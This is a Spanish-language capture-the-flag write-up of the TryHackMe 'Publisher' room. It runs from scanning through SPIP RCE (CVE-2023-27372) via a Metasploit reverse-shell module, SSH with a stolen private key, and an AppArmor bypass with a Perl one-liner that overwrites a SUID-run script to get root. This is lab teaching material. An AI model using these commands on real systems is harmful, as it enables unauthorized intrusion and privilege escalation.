

 
# Write-up: Publisher – TryHackMe

**Dificultad:** Media **Sistema operativo:** Linux (Ubuntu 20.04/22.04, kernel 5.15) **Técnicas clave:** CVE-2023-27372 (SPIP RCE), privesc vía SUID + bypass AppArmor, abuso de script writable.

## 1. Enumeración inicial

### Nmap

Escaneo inicial para descubrir puertos y servicios:

```
nmap -sC -sV -p- --open 10.64.176.81 -oN nmap.txt
```

**Resultados:**

```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



### Gobuster (directorio enumeration)



```
gobuster dir -u http://10.64.176.81 -w /usr/share/wordlists/dirb/common.txt
```

**Resultados:**

```
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 8686]
/images               (Status: 301) [Size: 315] [--> http://10.66.171.125/images/]
/spip                 (Status: 301) [Size: 313] [--> http://10.66.171.125/spip/]

```


El path /spip/ confirma que el CMS es **SPIP**.

## 2. Explotación web (SPIP RCE – CVE-2023-27372)

El sitio corre **SPIP 4.2.0** (vulnerable a CVE-2023-27372: RCE no autenticado)

Usamos el módulo de Metasploit:

```
use exploit/multi/http/spip_rce_form
set RHOSTS 10.64.176.81
set TARGETURI /spip
set LHOST 192.168.167.92
set LPORT 4444
exploit
```
Obtenemos shell como **www-data**.
![[Pasted image 20260212160947.png]]

## 3. Enumeración como www-data

Utilizo linpeas y encuentro un id_rsa procedo conectarme a think `ssh -i id_rsa think@10.64.176.81`
![[Pasted image 20260212193002.png]]

## 4. Enumeración como think 

Enumeré lo básico y trate de de pasarme linpeas para hacer otra enumeracion, ahi me di cuenta que no tenia permisos de escritura probando touch test.txt → **Permission denied**,busque una carpeta donde si tenga permisos me cambie a /dev/shm/ y ahí sí tenía permisos.

Bajé linpeas y ejecuté: ./linpeas.sh

Linpeas mostró:

- Binario SUID: /usr/sbin/run_container
- Script asociado: /opt/run_container.sh con permisos **-rwxrwxrwx** (777)


Intenté modificar el script directamente: 
```
```echo ... >> /opt/run_container.sh → **Permission denied** a pesar de los permisos 777
```

## 6. Detección de AppArmor

Como habia visto que tenia bloqueado los permrisos me fije con este comando

```
cat /proc/$$/attr/current

→ /usr/sbin/ash (complain)
```


El shell ash indicaba AppArmor activo. Aunque en modo complain (loguea pero no bloquea), había reglas deny explícitas para /opt/** w que impedían la escritura.

## 7. Bypass de AppArmor con Perl

Probé varios métodos hasta que **perl**:


```
perl -e 'open(F, ">/opt/run_container.sh"); print F "#!/bin/bash\n/bin/bash -ip\n"; close F; system("chmod +x /opt/run_container.sh");'
```

Esto sobreescribió el script con un shell root simple.

![[Pasted image 20260212205649.png]]


## Lecciones aprendidas

- Permisos 777 no garantizan escritura si hay AppArmor/SELinux.
- Modo complain no desactiva denegaciones explícitas (deny rules).
- Bypass de confinamiento: usar intérpretes permitidos (perl, python, find -exec).
- SUID + script writable = privesc directo una vez superado el bloqueo.